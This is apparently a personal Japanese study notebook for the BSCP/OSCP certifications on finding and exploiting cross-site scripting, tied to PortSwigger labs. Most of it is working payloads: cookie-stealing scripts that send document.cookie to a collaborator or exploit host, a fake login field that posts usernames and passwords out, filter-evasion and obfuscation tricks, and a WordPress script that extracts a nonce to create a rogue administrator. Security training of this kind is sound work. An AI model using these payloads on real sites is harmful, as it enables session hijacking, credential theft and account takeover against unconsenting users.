
🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

# Detect

[XSS](XSS.md)

🚨必ず一読：[🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
# 注目ポイント

- Post Comment機能
- Search機能
- 怪しげなJavaScriptファイル
- Check Stock機能
- Cookieの値が`username: token`の形式
- Remember me機能：Stay-logged-in Cookie
- (LiveChat機能): [2. WebSocketの脆弱性と悪用](../../../BSCP/Client-side/WebSockets/2.%20WebSocketの脆弱性と悪用.md#脆弱性を悪用するためのWebSocketメッセージの操作)

---
# Detect

## XSStrike

XSStrikeはxssに==脆弱でないものでも検知してしまう==かも。certainに気をつけて
- まずはXSStrikeでScanする。どの種類のXSS(DOM等)でもすぐ脆弱性が見つかる可能性が高い
```
cd /Users/ikedakoshiro/forBurpSuite/XSStrike
```

GETの場合
```zsh
python3 xsstrike.py -u "[URL]"
```
POSTの場合
```
python3 xsstrike.py -u "[URL]" --data "[body部のパラメタと値]"
```
HTTP headerも追加する場合
```
--headers
```

検知できなかった場合は↓へ

## Scanner

### 反射型

#### Search機能

- パラメタの値をScan
![[Pasted image 20240208105323.png | 400]]

#### JSファイル

- もしWeb cache poisoningの脆弱性も併せて検出したら、[🔍Web cache poisoning](../../../BSCP/Advanced/Web%20cache%20poisoning/🔍Web%20cache%20poisoning.md)へ

### 持続型

#### Comment機能

- Comment、Websiteのパラメタ値をScan 
	- OAST：[XSS](XSS.md#Comment機能の場合)
	- 通常↓
![[Pasted image 20240208110822.png | 400]]

##### Cookieが`username:token`の場合

- `username`をScan selected insertion point ->[XSS](XSS.md#Cookieがusername%20tokenの場合)

### DOM-based XSS

- DOM XSSはScannerじゃ見つからない可能性が高いので[🔍DOM-based Vuln](../../../BSCP/Client-side/DOM-based%20vuln/🔍DOM-based%20Vuln.md#Detect)へ

---

# Fuzz: XSS

- DevToolsのConsoleタブを開いてエラーなど観測してcontextを調整しながら:
```html
<script>alert(1)</script>
```
	or
```html
<img src=1 onerror="alert(1)">
```
	or
```html
<script src="data:,alert(1);//"></script>
```

## 補足：XSStrikeはFuzzのみに利用

- Intruderで選択してScanより速い(XSSに絞ってるから）
- SQLmapと同じでパラメタが必要。cookieも可
- 一瞬でなんの種類か検知する
![[Pasted image 20240218175137.png | 200]]
- ただペイロードが意味わからん
- 例えば以下だとすると
```
/search-results?search=hoge
```
	 ↓
```
{"results":[],"searchTerm":"hoge"}
```

- 検出するペイロードは
```
<DEtails%09ONPOINtErentEr+=+a=prompt,a()%0dx> 
```
	↓
```
<DEtails%09ONPOINtErentEr+=+a=prompt,a()%0dx> 
```
これじゃ悪用できない

結論：Detectには向くけど悪用には期待しない

---





---


##### Cookie窃取用スクリプト基本形

```
alert(1)
```
	↓
```
document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
```
	or
```
fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
```
	or
```
eval(atob("base64エンコードした上記2つのペイロード"))
```
[Web攻撃の難読化](../../../OSCP/Cheatsheet/Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#base64%20encoding)

---
### 基本形

## HTMLタグ内でのXSS

##### 🚨：HTMLタグ内でのXSSペイロード注入時の注意点

- HTML内に注入される時、タグは`>`だけで閉じることができる
```html
<h1>0 search results for 'ユーザの入力'</h1>
```
のとき、
```
"><body onresize=print()>"
```

- [🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)

---
### HTMLタグ内のXSSメソドロジー

1. 有効なtagを割り出す。[xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
```http
GET /?search=<§§> HTTP/2
...
```

2. 有効なeventを割り出す。cheat sheetのCopy events to clipboardしてペースト(`%20`=空白)
```http
GET /?search=<有効なタグ%20§§=1> HTTP/2
...
```

3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なpayload候補を取得する。
4. コンテキストに合わせ改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する[4. XSS contexts](#🚨：HTMLタグ内でのXSSペイロード注入時の注意点)
```html
<iframe src="https://0a4b003c0362b495817bca6e00b4007f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

---
#### すべてのタグが禁止されている場合

すべて禁止されてはないけどXSS cheat sheetに有効そうなタグがないときも

- custom tagを使用する
- エクスプロイトサーバにホストしdeliver
```html
<script>
	location = 'https://TARGET_NET/?search=<xss+id=x+onfocus=document.location='https://COLLABORATOR_DOMAIN/?c='+document.cookie tabindex=1>#x';
</script>
```

---
## HTMLタグ属性内のXSS

- `<>`は注入不可でも、引用符を注入できる場合、新たな属性を追加する
🚨開発者ツールで注入後のコンテキストを確認し、文法は維持すること

- 例
```html
<input type="text" value="user_input_here" name="username"> 
```
	↓
```html
<input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username"> 
```

### href属性のケース

```html
<a href="javascript:alert(document.cookie)">
```
- ↓リンクをクリックしたらスクリプトが実行される
![[Pasted image 20231226192331.png | 200]]

---
### headタグ内にcanonicalが設定されているケース

1. `<head>`タグ内に`canonical`が設定されていることを確認する
2. 適当なクエリストリングを検索し、`<link rel="canonical" href="">`のhrefに反映されるか試す
```html
<link rel="canonical" href='https://example/?aaa'/>
```

3. hrefに反映されることを悪用し、payloadを注入する。
```
http://example/?'accesskey='x'onclick='alert(1)
```
	↓
```html
<link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
```

---
## JavaScriptへのXSS

### 既存のスクリプトを強制終了させ任意のJSを実行する方法

1. スクリプト内にユーザが制御可能(入力等)な値が存在する箇所を見つける
```js
<script> 
... var input = 'ここに入力'; 
... 
</script>
```

2. 既存のスクリプトを閉じさせてペイロードを注入する
```js
</script><img src=1 onerror=alert(document.cookie)>
```

---
### 引用符('or")で囲まれた文字列からの脱却

###### 基本的な文字列からの脱却

```js
'-alert(1)-'
```
```js
';alert(1)//
```
- 前後に適当な文字列を入れる場合もある(`aa'-alert(1)-'aa)

###### 引用符がエスケープされるケース

1. 引用符(`'`or`"`)を入力し、`\`でエスケープされることを確認する
2. `\`を入力し、エスケープされない脆弱性があるか確認する
3. 基本的なpayloadに`\`を追加して送信する
```js
\';alert(1)//'
```

---
### HTMLエンコードの利用

- 引用符で囲まれた属性値にJavaScriptが存在するとき
```html
<a href="#" onclick="... var input='ここに入力'; ...">
```

- 引用符をHTMLエンコードして脱却
```js
&apos;-alert(1)-&apos;
```
- [4. XSS contexts](#基本的な文字列からの脱却)の引用符をHTMLエンコードする
- URLとして組み込む場合は自然な形式となるようにクエリストリングに注入する
```url
http://foo?&apos;-alert(1)-&apos;
```
- [LAB](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
###### 利用可能なケース

- イベントハンドラのように、
- 引用符で既存のJSを抜け出すために、引用符をHTMLエンコードした形式で入力する

---
### JSテンプレートリテラルの利用

###### 利用可能なケースと特徴

- 入力した内容がテンプレートリテラル([JavaScriptとJSON](../../../BSCP/Misc/JavaScriptとJSON.md#テンプレートリテラルとは))に埋め込まれているケース
- 他のテクニックと違って、既存のJSを終了させる必要がない。

###### 方法

- \`\`で囲まれている入力可能な場所に、`${}`でJSの式を埋め込む
```js
<script> 
... 
var input = `ここに入力`; 
...
</script>
```
	↓
```js
${alert(1)}
```

---
## Misc

###### 難読化

```js
<img src=1 onerror=alert(1)>
```
	↓
```js
<img src=1 oNeRrOr=alert`1`)
```
- alertはテンプレートリテラルを使用。alertという関数の引数としてバッククウォートで囲まれた1を渡す

- その他 [XSS cheat sheet Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation:~:text=27%27%3B%22%3EXSS%3C/a%3E-,Obfuscation,-Data%20protocol%20inside)
- [OWASP XSS Filter Evasion](### Filter Bypass Alert Obfuscation[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#filter-bypass-alert-obfuscation "Permanent link"))

###### クエリストリングへの埋め込み

```http
/any?xss='><script>alert(1)</script>
```

###### もしURLエンコードされて実行されないならWebキャッシュポイズニング

- [3. 実装の欠陥の悪用](../../../BSCP/Advanced/Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/3.%20実装の欠陥の悪用.md#正規化されたCache%20keyの悪用)

###### Stay-logged-in Cookieを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```js
<script>
	document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
</script>
```

2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する

---

### Privilege Escalation w/XSS & CSRF

(cookieを窃取して実行する方法はBSCPノートを閲覧)

- 目的：高権限のユーザーを作成

- 攻撃のシチュエーション：
	- CookieにHTTP onlyフラグが付与されていて、JavaScriptでは窃取できないとき
	- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき

- 参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

#### 手順

1. ソースコードもしくはFuzzingでXSSに脆弱なHTTPヘッダーなどを洗い出す（BSCPノートを参照）
	（今回はVisitorsプラグインの`user-agent`が脆弱であるとする）

2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく

3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）

nonce抽出
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
- 3行目にアクション実行先のHTTPリクエスト
- 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的

抽出したnonceを使用してアクションを実行するリクエストを作成する
```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している

4. [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。

5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）

![](../../Images/Pasted%20image%2020250321200240.png)

6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功

![](../../Images/Pasted%20image%2020250320123601.png)

![](../../Images/Pasted%20image%2020250320123617.png)

---

### OAST

###### username & passwordを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
2. Request to collaboratorを確認

##### Cookieを取得する

###### Comment機能の場合

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<script>
fetch('https://COLLABORATOR_DOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Request to collaboratorを確認

###### Cookieがusername:tokenの場合

1. `username`の箇所にスクリプトを注入
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
- `encodeURIComponent()`: URLの一部としてcookieを送るときに使用
2. Request to collaboratorを確認

---
## Misc

###### Reflected XSS基本payload

1. no user interaction in HTML
```html
<iframe src="https://TARGET_NET?[vuln_param]=[payload]">
```
![[Pasted image 20240218101126.png | 50]]↓

2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
```html
<script>
location = 'https://TARGET_NET?[vuln_param]=[payload]'
</script>
```

###### Stored XSS基本payload
```js
<script>alert(1)</script>
```

```html
<img src=1 onerror=alert(1)>
```
